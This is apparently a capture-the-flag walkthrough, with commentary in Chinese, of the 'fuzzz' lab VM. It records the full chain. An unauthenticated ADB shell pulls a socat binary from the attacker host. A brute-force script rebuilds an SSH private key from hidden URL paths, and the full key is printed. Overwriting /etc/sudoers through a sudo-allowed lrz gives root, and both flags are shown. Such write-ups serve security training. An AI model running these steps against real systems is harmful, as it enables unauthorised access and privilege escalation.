```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                   
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.163 08:00:27:38:b0:90       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e4:9a:30       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.285 seconds (112.04 hosts/sec). 4 responded
                                                                                                   
```

192.168.205.163

服务探测

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5555/tcp open  freeciv
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds                       

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p5555 -sV 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00035s latency).

PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge (token auth required)
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
```

adb，连接上去

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb connect 192.168.205.163:5555
connected to 192.168.205.163:5555
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb devices                     
List of devices attached
192.168.205.163:5555    device

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb shell  
/ $ id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
/ $ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for runner: 
sudo: a password is required
/ $ cd 
~ $ ls -al
total 8
drwx------    2 runner   runner        4096 May 19 09:08 .
drwxr-xr-x    4 root     root          4096 May 19 10:02 ..
lrwxrwxrwx    1 root     runner           9 May 19 09:08 .ash_history -> /dev/null
~ $ ss -tnlp
/bin/sh: ss: not found
~ $ netstat -lntup
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      2513/python3
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
```

传一个socat转发端口(这里的socat需要静态编译的，它这个靶机貌似是alpine的，所以你直接拉kali的socat是不行的，自己去网上下一个，有编译好的)

```
~ $ wget 192.168.205.128/socat
Connecting to 192.168.205.128 (192.168.205.128:80)
saving to 'socat'
socat                100% |********************************| 4724k  0:00:00 ETA
'socat' saved
~ $ chmod +x socat
~ $ ./socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &
```

看看服务转发出来没有（这个shell会自动断开，所以如果断开重新连就好了，反正就传一个socat上去）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p8000 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:13 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00032s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

访问

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000          
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000 -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 192.168.205.163 left intact
```

目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.163:8000 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/hgfs/gx/x/reports/http_192.168.205.163_8000/_25-07-01_20-18-36.txt

Target: http://192.168.205.163:8000/

[20:18:36] Starting: 

Task Completed
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/line                 (Status: 200) [Size: 0]
/line2                (Status: 200) [Size: 0]
/line1                (Status: 200) [Size: 0]
Progress: 35450 / 1102800 (3.21%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 36260 / 1102800 (3.29%)
===============================================================
Finished
===============================================================
```

这里我停了，因为它爆破出来的/line有点像分开藏东西

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000/line -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000/line/ -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line/ HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 404 NOT FOUND
< Content-Type: text/html; charset=utf-8
< Content-Length: 207
< 
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                     
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 465323 / 1102800 (42.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 466276 / 1102800 (42.28%)
===============================================================
Finished
===============================================================                   
```

看看其他的

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line1
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line1 HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line2
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line2 HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line1/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line1/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 23647 / 1102800 (2.14%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24595 / 1102800 (2.23%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line2/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,zip,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Q                    (Status: 200) [Size: 0]
Progress: 51864 / 1102800 (4.70%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 53006 / 1102800 (4.81%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line3                                                                                                                         
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line3 HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line4
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line4 HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line5
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line5 HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line6
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
> GET /line6 HTTP/1.1
> Host: 192.168.205.163:8000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 404 NOT FOUND
< Content-Type: text/html; charset=utf-8
< Content-Length: 207
< 
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line3/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line3/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/X                    (Status: 200) [Size: 0]
Progress: 39151 / 1102800 (3.55%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 39753 / 1102800 (3.60%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line4/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/A                    (Status: 200) [Size: 0]
Progress: 28543 / 1102800 (2.59%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 28874 / 1102800 (2.62%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line5/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line5/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/5                    (Status: 200) [Size: 0]
Progress: 23689 / 1102800 (2.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24483 / 1102800 (2.22%)
===============================================================
Finished
===============================================================
```

看起来像爆破字符，先爆破一行看看

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ chars=({a..z} {A..Z} {0..9}); dir=""; while true; do found=false; for c in "${chars[@]}"; do testdir="$dir$c"; res=$(curl -s -o /dev/null -w "%{http_code}" "http://192.168.205.163:8000/line1/$testdir"); [[ "$res" == "200" ]] && { echo "Found: $testdir"; dir="$testdir"; found=true; break; }; done; $found || break; done
Found: b
Found: b3
Found: b3B
Found: b3Bl
Found: b3Blb
Found: b3Blbn
Found: b3BlbnN
Found: b3BlbnNz
Found: b3BlbnNza
Found: b3BlbnNzaC
Found: b3BlbnNzaC1
Found: b3BlbnNzaC1r
Found: b3BlbnNzaC1rZ
Found: b3BlbnNzaC1rZX
Found: b3BlbnNzaC1rZXk
Found: b3BlbnNzaC1rZXkt
Found: b3BlbnNzaC1rZXktd
Found: b3BlbnNzaC1rZXktdj
Found: b3BlbnNzaC1rZXktdjE
Found: b3BlbnNzaC1rZXktdjEA
Found: b3BlbnNzaC1rZXktdjEAA
Found: b3BlbnNzaC1rZXktdjEAAA
Found: b3BlbnNzaC1rZXktdjEAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG
Found: b3BlbnNzaC1rZXktdjEAAAAABG5
Found: b3BlbnNzaC1rZXktdjEAAAAABG5v
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmU
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9u
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAM
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2g
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo "b3BlbnNzaC1rZXktdjE" | base64 -d 
openssh-key-v1                                                                  
```

是OpenSSH私钥
重新写一个脚本

```
#!/bin/bash

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+="
dir=""

for line in {1..5}; do
  url="http://192.168.205.163:8000/line$line/"
  dir=""
  while true; do
    found=0
    for ((i=0; i<${#chars}; i++)); do
      c="${chars:$i:1}"
      testdir="$dir$c"
      code=$(curl -s -o /dev/null -w "%{http_code}" "$url$testdir")
      if [ "$code" = "200" ]; then
        dir="$testdir"
        echo -n "$c"
        found=1
        break
      fi
    done
    [ $found -eq 0 ] && break
  done
  echo
done
```

运行

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash bp.sh
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
```

拼接一下

```
┌──(kali㉿kali)-[~]
└─$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

改权限

```
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ ssh asahi@192.168.205.163 -i id_rsa
The authenticity of host '192.168.205.163 (192.168.205.163)' can't be established.
ED25519 key fingerprint is SHA256:y+2KKHDaMy8FmNZpu0PMG4PJ+b1w5rQQScGZYvJj4L8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.163' (ED25519) to the list of known hosts.

fuzzz:~$ id
uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)
fuzzz:~$ sudo -l
Matching Defaults entries for asahi on fuzzz:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asahi:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User asahi may run the following commands on fuzzz:
    (ALL) NOPASSWD: /usr/local/bin/lrz
```

lrz用于通过 ZMODEM/YMODEM/XMODEM 协议接收文件

然后看帮助文档

```
-C, --allow-remote-commands allow execution of remote commands (Z)
```

这个选项的字面意思就是“**允许执行远程命令**”。

然后扒拉了很久，都没行

我也尝试了上传文件覆盖，但是应该是我Tabby有问题，覆盖不了

后面看到

```
--tcp-server            open socket, wait for connection (Z)
```

so

```
fuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server
connect with lrz --tcp-client "fuzzz.hmv:46143"
```

kali

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat sudoers
asahi ALL=(ALL:ALL) NOPASSWD: ALL
                                         
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sz --tcp-client 192.168.205.163:46143 -y sudoers
connecting to [192.168.205.163] <46143>
```

靶机弹出了

```
lrz waiting to receive.fuzzz:/etc$ sudo -l
User asahi may run the following commands on fuzzz:
    (ALL : ALL) NOPASSWD: ALL
fuzzz:/etc$ sudo su
/etc # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/etc # cat /root/root.flag 
flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
/etc # cat /home/asahi/user.flag 
flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
```

